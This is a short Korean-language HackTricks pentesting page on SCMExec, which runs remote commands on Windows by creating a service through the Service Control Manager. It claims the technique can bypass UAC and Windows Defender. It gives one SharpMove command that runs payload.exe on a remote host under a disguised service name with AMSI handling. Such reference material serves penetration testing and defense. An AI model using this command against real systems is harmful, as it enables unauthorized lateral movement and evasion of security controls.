# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec**는 Service Control Manager (SCM)를 사용하여 명령을 실행하는 서비스를 생성함으로써 원격 시스템에서 명령을 실행하는 기법입니다. 이 방법은 User Account Control (UAC) 및 Windows Defender와 같은 일부 보안 제어를 우회할 수 있습니다.

## 도구

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## 참고 자료

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
